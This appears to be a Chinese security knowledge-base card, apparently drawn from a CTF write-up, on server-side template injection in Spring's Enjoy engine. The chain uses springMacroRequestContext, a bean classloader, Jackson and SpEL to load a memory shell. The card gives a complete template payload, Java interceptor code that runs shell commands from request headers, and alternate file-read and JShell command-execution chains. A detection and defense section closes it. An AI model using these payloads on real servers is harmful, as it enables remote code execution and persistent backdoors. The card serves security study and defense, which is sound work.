---
id: web-java-framework-spring-enjoy-template-springmacrocontext-spel-memshell
title: Enjoy 模板引擎 SSTI：springMacroRequestContext 取 Spring Bean/ClassLoader，经 Jackson+SpEL 加载内存马
type: scenario
domain: web
path: web/java/framework/spring
technique: enjoy-template-springmacrocontext-spel-memshell
tags:
- java
- spring
- spring-boot
- enjoy
- ssti
- template-injection
- spel
- jackson
- classloader
- memshell
- jdk18
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: Enjoy 5.1.2（原文标注；springMacroRequestContext 默认开放）
verification:
  verified_by: verifier-V154
  verified_at: '2026-11-06T07:36:22+08:00'
  notes: '已对照原文与图01-14核对：springMacroRequestContext.webApplicationContext→internalCachingMetadataReaderFactory.resourceLoader.classLoader.loadClass(SpelExpressionParser)→jacksonObjectMapper.readValue(\"{}\", clazz)→parseExpression(URLClassLoader 加载 SpringInterceptorMemShell).getValue() 与原文模板 payload 逐行一致；图09 显示 Enjoy ExprParser 解析期即检查 isStaticMethodExpressionEnabled 并抛 ParseException；图13/14 为模板渲染与 x-client-data/cmd 回显，佐证内存马注册与命令执行；备选 #include 与 JShell 静态方法链与原文末段一致。未验证点：未本地复跑；internalCachingMetadataReaderFactory/jacksonObjectMapper Bean 名称及 JDK18 Unsafe module 绕过需按目标环境复核（相关内存马已有独立卡片）；Enjoy 5.1.2 为原文标注版本。frontmatter 无 sources/source_url（全库惯例）。'
url: /docs/web/java/framework/spring/web-java-framework-spring-enjoy-template-springmacrocontext-spel-memshell/
draft: false
kb_aliases:
- Enjoy SSTI
- JFinalViewResolver
- springMacroRequestContext
- internalCachingMetadataReaderFactory
- SpelExpressionParser
- Jackson ObjectMapper 实例化
- SpringInterceptorMemShell
- JDK18 内存马
---

## 一句话结论

Spring MVC 集成 Enjoy 5.1.2 且 `exposeSpringMacroHelpers=true` 时，模板上下文会暴露 `springMacroRequestContext`；拿到 `webApplicationContext` 后，可以从 `internalCachingMetadataReaderFactory` Bean 的 `resourceLoader.classLoader` 加载任意类，再用 `jacksonObjectMapper.readValue("{}", SpelExpressionParser.class)` 实例化 SpEL 解析器，最后 `parseExpression(...).getValue()` 执行 SpEL，用 `URLClassLoader` 加载上传的内存马类并注册到 Spring MVC 的 `adaptedInterceptors`，形成命令执行内存马。

## 原理

- **Enjoy 的模板上下文**：JFinalViewResolver 在 `setExposeSpringMacroHelpers(true)` 时把 Spring 的 `springMacroRequestContext`（`RequestContext`）放入模板模型；该对象暴露 `getWebApplicationContext()`，即整个 Spring `WebApplicationContext`。Enjoy 5.1.2 默认开放该对象（官方提供关闭接口，但未默认关闭）。
- **静态方法 API 被关闭**：Enjoy 5.02 之后关闭了静态方法调用；模板解析器在扫描阶段就检查 `engineConfig.isStaticMethodExpressionEnabled()`，不满足直接抛 `ParseException`。因此 FreeMarker 那套“先拿引擎打开开关再执行静态方法”的链在单次模板渲染里走不通——还没执行到 `setStaticMethodExpression(true)` 就已经解析失败。
- **换用 Spring Bean 链**：从 `webApplicationContext` 取 `org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory` Bean。它是 Spring Boot 自动配置的 `CachingMetadataReaderFactory`，其 `resourceLoader` 是加载应用的 `LaunchedURLClassLoader`，`getClassLoader()` 返回的类加载器把 `loadClass` 暴露为 public，可加载当前环境任意类。
- **加载 SpEL 解析器类**：`cachingMetadataReaderFactory.resourceLoader.classLoader.loadClass("org.springframework.expression.spel.standard.SpelExpressionParser")` 只加载 `Class` 对象，不实例化。
- **用 Jackson 实例化**：`applicationContext.getBean("jacksonObjectMapper").readValue("{}", clazz)` 让 Jackson 把空 JSON 反序列化为 `SpelExpressionParser`，等价于调用其无参构造器。这样绕过了“模板里不能直接 new/静态调用”的限制，得到可用的 SpEL 解析器实例。
- **SpEL 执行**：`instance.parseExpression(expr).getValue()` 对表达式求值；SpEL 默认允许 `T(...)` 类型引用和 `new`。表达式 `T(java.net.URLClassLoader).newInstance(new java.net.URL[]{new java.net.URL('file:///.../SpringInterceptorMemShell')}).loadClass('SpringInterceptorMemShell').newInstance()` 创建指向上传目录的 URLClassLoader，加载并实例化内存马类。
- **内存马注册**：`SpringInterceptorMemShell` 构造器先做 JDK 高版本模块绕过（Unsafe 改 `Class.module`，详见关联卡），再通过 `RequestContextHolder`/`WebApplicationContextUtils` 取 `WebApplicationContext`，从 `requestMappingHandlerMapping` Bean 取出 `AbstractHandlerMapping.adaptedInterceptors`，把恶意 `HandlerInterceptor` 加入列表。之后任意请求携带 `x-client-data: cmd` 与 `cmd` 头即执行命令并回显。
- **为什么选 `internalCachingMetadataReaderFactory`**：Spring Boot 自动配置默认注册该 Bean；它的 `resourceLoader` 是应用类加载器，且 `loadClass` 可访问。不同版本/项目可换其它暴露 `resourceLoader`/`classLoader` 的 Bean，或直接使用 `Thread.currentThread().getContextClassLoader()`。
- **为什么选 Jackson**：`jacksonObjectMapper` 是 Spring Boot 默认 Bean；`ObjectMapper.readValue(String, Class)` 能通过无参构造/反射创建任意可反序列化类，是“只有方法调用、没有 new”的模板环境里通用的实例化 gadget。
- **JDK18 兼容**：SpEL + URLClassLoader 本身不依赖 JDK 版本；内存马类在 JDK18 下需要绕过模块强封装才能 `defineClass`/反射注册，文章用 Unsafe 改 `Class.module` 实现（已有独立卡片）。

## 触发条件

- 应用使用 Spring MVC + Enjoy（JFinalViewResolver），`exposeSpringMacroHelpers=true`（Enjoy 5.1.2 默认开放 `springMacroRequestContext`）。
- 存在模板注入或可写模板文件（例如前置 ZipSlip 覆盖 `hello.html`）。
- Spring 容器中存在 `org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory` Bean 与 `jacksonObjectMapper` Bean（Spring Boot 默认配置通常具备；不同项目需枚举/替换）。
- `springMacroRequestContext.webApplicationContext` 可从模板访问，且 `getBean` 未被安全包装阻断。
- 攻击者能把内存马 class 文件写到目标可读目录（如上传目录），或已有可加载的恶意类。
- 目标 JDK 为高版本时，内存马需配合 `Class.module` 绕过；若只做 SpEL 命令执行则无需内存马。

## 利用步骤

1. 先通过 ZipSlip/模板覆盖把 Enjoy 模板写到 `/usr/src/app/template/admin/hello.html`，内容为下面的 SSTI 链；或找到已有模板注入点。
2. 模板中取 `springMacroRequestContext.webApplicationContext`。
3. 取 `internalCachingMetadataReaderFactory` Bean，拿 `resourceLoader.classLoader`，`loadClass("org.springframework.expression.spel.standard.SpelExpressionParser")`。
4. 用 `jacksonObjectMapper.readValue("{}", clazz)` 实例化解析器。
5. `parseExpression(SpEL)`，在 SpEL 中用 `URLClassLoader` 加载上传目录下的 `SpringInterceptorMemShell` 并 `newInstance()`；构造器完成 `adaptedInterceptors` 注册。
6. 访问任意业务路径，带 `x-client-data: cmd` 和 `cmd: id` 验证命令执行；后续可用内存马持久化。
7. 备选：若只想读 flag，可用 Enjoy 的 `#include("../../filename")`；或分两个模板，第一个用 `springMacroRequestContext.webApplicationContext.getBean('jfinalViewResolver').engine.setStaticMethodExpression(true)` 打开静态方法，第二个用 `jdk.jshell.JShell::create()` 执行命令。

## PoC

Enjoy 模板 payload（原文核心链）：

```html
#set(applicationContext = springMacroRequestContext.webApplicationContext)
#set(cachingMetadataReaderFactory = applicationContext.getBean('org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory'))
#set(clazz = cachingMetadataReaderFactory.resourceLoader.classLoader.loadClass("org.springframework.expression.spel.standard.SpelExpressionParser"))
#set(instance = applicationContext.getBean("jacksonObjectMapper").readValue("{}", clazz))
#(instance.parseExpression("T(java.net.URLClassLoader).newInstance(new java.net.URL[]{new java.net.URL('file:////usr/src/app/upload/SpringInterceptorMemShell')}).loadClass('SpringInterceptorMemShell').newInstance()").getValue())
```

内存马命令执行部分：

```java
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
    if (request.getHeader("x-client-data").equalsIgnoreCase("cmd")) {
        String cmd = request.getHeader("cmd");
        String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                ? new String[]{"cmd", "/c", cmd}
                : new String[]{"/bin/bash", "-c", cmd};
        String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())
                .useDelimiter("\\A").next();
        response.getWriter().write(result);
        return false;
    }
    return true;
}
```

备选读文件/静态方法链：

```text
#include("../../flag")

#(springMacroRequestContext.webApplicationContext.getBean('jfinalViewResolver').engine.setStaticMethodExpression(true))
#((jdk.jshell.JShell::create()).eval('Runtime.getRuntime().exec(new String[]{"bash","-c","cat /flag > /tmp/test.txt"});'))
```

原文实测最终 GetShell；本卡不执行 PoC。Bean 名称、模板路径、上传目录和 JDK 版本需按目标调整。

## 变体与关联

- **换 Bean**：若 `internalCachingMetadataReaderFactory` 不存在，可枚举其它带 `resourceLoader`/`classLoader` 的 Bean，或从 `RequestContextHolder` 取当前线程类加载器。
- **换实例化方式**：Jackson 之外，可用 `java.beans.Beans.instantiate`、`BeanUtils.instantiateClass`、`ObjectMapper` 的其它重载，或 SpEL 自身的 `new`（若能直接构造解析器）。
- **不用 SpEL**：Enjoy 的 `#include` 可读文件；若静态方法已开启，`jdk.jshell.JShell::create()` 可直接执行 Java 代码；也可用 `Runtime`/`ProcessBuilder` 反射。
- **内存马类型**：Interceptor（本例）、Controller、Filter、Tomcat Valve 等；注册方式不同，核心都是先拿到 WebApplicationContext。
- **JDK 版本**：JDK17+ 需要 `Class.module` 绕过（见关联卡）；JDK8 可直接 `defineClass`/反射。
- 关联：[[web-java-classloader-jdk17-class-module-field-spoof]]（Unsafe 改 Class.module）、[[web-java-framework-spring-mvc-interceptor-memshell]]（adaptedInterceptors 注册）、[[web-java-framework-spring-freemarker-macro-context-resolver-reset]]（FreeMarker 的 springMacroRequestContext 链）、[[web-generic-file-upload-ant-zipslip-leading-dotdot-prefix-bypass]]（前置模板覆盖）。

## 检测与防御

- **模板注入**：不要把用户输入/可写文件当模板；Enjoy/JFinalViewResolver 使用固定模板目录，模板目录只读；关闭 `setExposeSpringMacroHelpers(true)`（或升级/配置为不暴露 `springMacroRequestContext`）。
- **模板沙箱**：启用 Enjoy 的安全配置，禁用静态方法、限制可访问的对象/Bean；不要向模板暴露 `WebApplicationContext`、`ClassLoader`、`ObjectMapper` 等敏感对象。
- **Bean 暴露**：限制 `getBean` 在模板中的可达性；对 `internalCachingMetadataReaderFactory`、`jacksonObjectMapper` 等 Bean 做安全封装/移除。
- **内存马检测**：检查 `adaptedInterceptors` 中是否有异常拦截器；监控 `HandlerInterceptor` 动态注册、`URLClassLoader` 加载上传目录 class、`Class.module` 被 Unsafe 修改；检测 `x-client-data: cmd` 等自定义头。
- **文件上传**：修复 ZipSlip/模板覆盖，模板目录与上传目录隔离；上传的 class 文件不应可被应用类加载器加载。
- **JDK 加固**：升级 JDK、限制 `sun.misc.Unsafe`（`--limit-modules`）、启用 SecurityManager/Agent 监控；但根本仍是消除模板注入与不安全的模板上下文暴露。
